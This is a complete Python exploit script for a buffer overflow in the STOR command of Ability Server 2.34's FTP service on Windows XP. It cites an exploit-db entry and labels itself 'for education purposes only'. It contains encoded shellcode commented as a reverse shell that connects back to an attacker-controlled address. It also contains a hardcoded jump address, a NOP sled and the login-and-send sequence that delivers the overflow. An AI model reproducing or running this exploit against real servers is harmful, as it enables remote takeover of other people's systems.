#Ability Server 2.34 FTP STOR Buffer Overflow windows XP 32bit
# Ref : http://www.exploit-db.com/exploits/588/
#FOR EDUCATION PURPOSES ONLY!
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 7E429353   FFE4             JMP ESP
# reverse shell on 192.168.10.154 port 1030
shellcode = ("\x2b\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd5"
"\x61\x31\xf8\x83\xeb\xfc\xe2\xf4\x29\x0b\xda\xb5\x3d\x98\xce\x07"
"\x2a\x01\xba\x94\xf1\x45\xba\xbd\xe9\xea\x4d\xfd\xad\x60\xde\x73"
"\x9a\x79\xba\xa7\xf5\x60\xda\xb1\x5e\x55\xba\xf9\x3b\x50\xf1\x61"
"\x79\xe5\xf1\x8c\xd2\xa0\xfb\xf5\xd4\xa3\xda\x0c\xee\x35\x15\xd0"
"\xa0\x84\xba\xa7\xf1\x60\xda\x9e\x5e\x6d\x7a\x73\x8a\x7d\x30\x13"
"\xd6\x4d\xba\x71\xb9\x45\x2d\x99\x16\x50\xea\x9c\x5e\x22\x01\x73"
"\x95\x6d\xba\x88\xc9\xcc\xba\xb8\xdd\x3f\x59\x76\x9b\x6f\xdd\xa8"
"\x2a\xb7\x57\xab\xb3\x09\x02\xca\xbd\x16\x42\xca\x8a\x35\xce\x28"
"\xbd\xaa\xdc\x04\xee\x31\xce\x2e\x8a\xe8\xd4\x9e\x54\x8c\x39\xfa"
"\x80\x0b\x33\x07\x05\x09\xe8\xf1\x20\xcc\x66\x07\x03\x32\x62\xab"
"\x86\x22\x62\xbb\x86\x9e\xe1\x90\x15\xc9\x3b\x62\xb3\x09\x21\x19"
"\xb3\x32\xb8\x19\x40\x09\xdd\x01\x7f\x01\x66\x07\x03\x0b\x21\xa9"
"\x80\x9e\xe1\x9e\xbf\x05\x57\x90\xb6\x0c\x5b\xa8\x8c\x48\xfd\x71"
"\x32\x0b\x75\x71\x37\x50\xf1\x0b\x7f\xf4\xb8\x05\x2b\x23\x1c\x06"
"\x97\x4d\xbc\x82\xed\xca\x9a\x53\xbd\x13\xcf\x4b\xc3\x9e\x44\xd0"
"\x2a\xb7\x6a\xaf\x87\x30\x60\xa9\xbf\x60\x60\xa9\x80\x30\xce\x28"
"\xbd\xcc\xe8\xfd\x1b\x32\xce\x2e\xbf\x9e\xce\xcf\x2a\xb1\x59\x1f"
"\xac\xa7\x48\x07\xa0\x65\xce\x2e\x2a\x16\xcd\x07\x05\x09\xc1\x72"
"\xd1\x3e\x62\x07\x03\x9e\xe1\xf8")
# jump esp 77D8AF0A
buffer = "\x41"*965 + "\x0A\xAF\xD8\x77" + "\x43"*15 + "\x90"*16 + shellcode + "\x44"*1000
print "\nSending evil buffer..."
s.connect(('192.168.11.89',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
s.send('STOR ' +buffer+'\r\n')
print "[+] Sending payload of size", len(buffer)
s.close()


